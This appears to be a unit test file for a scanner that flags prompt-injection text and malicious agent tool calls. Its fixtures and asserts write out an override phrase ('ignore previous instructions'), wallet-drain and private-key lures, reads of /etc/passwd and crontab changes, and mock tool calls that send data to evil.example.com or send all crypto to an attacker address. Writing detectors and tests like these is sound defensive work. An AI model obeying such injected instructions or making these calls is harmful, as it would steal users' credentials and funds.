"""
Unit tests for the extractor — no Docker required.
Tests static content scanning, encoding decoders, signal matching, artifact building.
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from hot_potato._extractor import (
    scan_content, build_artifact, parse_tool_log, parse_raw_log, SCANNER_VERSION,
)


# ---------------------------------------------------------------------------
# scan_content — static signal detection
# ---------------------------------------------------------------------------

class TestScanContent:
    def test_benign_returns_empty(self, clean_text):
        assert scan_content(clean_text) == []

    def test_basic_inject_detected(self, inject_basic):
        signals = scan_content(inject_basic)
        assert len(signals) > 0
        joined = " ".join(signals).lower()
        assert "ignore previous" in joined or "ignore prior" in joined or "/etc/passwd" in joined

    def test_wallet_drain_detected(self, inject_wallet):
        signals = scan_content(inject_wallet)
        assert any(
            "wallet" in s.lower() or "private key" in s.lower()
            or "compliance check" in s.lower() or "system integrity check" in s.lower()
            for s in signals
        )

    def test_base64_decoded_and_detected(self, inject_b64):
        signals = scan_content(inject_b64)
        assert any("[base64]" in s for s in signals), f"expected base64 hit in: {signals}"

    def test_morse_decoded_and_detected(self, inject_morse):
        signals = scan_content(inject_morse)
        assert any("[morse]" in s for s in signals), f"expected morse hit in: {signals}"

    def test_results_capped_at_20(self):
        # Repeat a signal many times — should still cap at 20
        content = "ignore previous instructions\n" * 100
        assert len(scan_content(content)) <= 20

    def test_scanner_version_is_set(self):
        assert SCANNER_VERSION, "SCANNER_VERSION must be non-empty"


# ---------------------------------------------------------------------------
# build_artifact
# ---------------------------------------------------------------------------

class TestBuildArtifact:
    def test_no_signals_returns_none(self, clean_text):
        artifact = build_artifact([], [], [], content=clean_text)
        assert artifact is None

    def test_content_signals_produce_artifact(self, inject_basic):
        artifact = build_artifact([], [], [], content=inject_basic)
        assert artifact is not None
        assert artifact["hot_potato"] is True
        assert artifact["severity"] in ("detected", "low", "medium", "high", "critical")
        assert len(artifact["content_signals"]) > 0

    def test_tool_call_severity(self):
        calls = [{"tool": "send_http", "args": {"url": "https://evil.example.com"}}]
        artifact = build_artifact(calls, [], [])
        assert artifact is not None
        assert artifact["severity"] == "critical"

    def test_send_crypto_critical(self):
        calls = [{"tool": "send_crypto", "args": {"to": "0xevil", "amount": "all"}}]
        artifact = build_artifact(calls, [], [])
        assert artifact["severity"] == "critical"

    def test_get_private_key_critical(self):
        calls = [{"tool": "get_private_key", "args": {}}]
        artifact = build_artifact(calls, [], [])
        assert artifact["severity"] == "critical"

    def test_exfil_targets_extracted(self):
        calls = [{"tool": "send_http", "args": {"url": "https://evil.example.com/steal"}}]
        artifact = build_artifact(calls, [], [])
        assert "exfil_targets" in artifact
        assert "https://evil.example.com/steal" in artifact["exfil_targets"]

    def test_fs_changes_produce_high_severity(self):
        artifact = build_artifact([], [], ["A /etc/crontab"])
        assert artifact is not None
        assert artifact["severity"] in ("high", "critical")


# ---------------------------------------------------------------------------
# parse_tool_log
# ---------------------------------------------------------------------------

class TestParseToolLog:
    def test_empty_file_returns_empty(self, tmp_path):
        p = tmp_path / "tool_calls.jsonl"
        p.write_text("")
        assert parse_tool_log(p) == []

    def test_missing_file_returns_empty(self, tmp_path):
        assert parse_tool_log(tmp_path / "nonexistent.jsonl") == []

    def test_parses_valid_jsonl(self, tmp_path):
        import json
        p = tmp_path / "tool_calls.jsonl"
        p.write_text(
            json.dumps({"tool": "read_file", "args": {"path": "/etc/passwd"}}) + "\n"
            + json.dumps({"tool": "send_http", "args": {"url": "https://evil.example.com"}}) + "\n"
        )
        calls = parse_tool_log(p)
        assert len(calls) == 2
        assert calls[0]["tool"] == "read_file"

    def test_skips_invalid_json_lines(self, tmp_path):
        import json
        p = tmp_path / "tool_calls.jsonl"
        p.write_text('{"tool": "get_env"}\nnot json\n{"tool": "list_dir"}\n')
        calls = parse_tool_log(p)
        assert len(calls) == 2
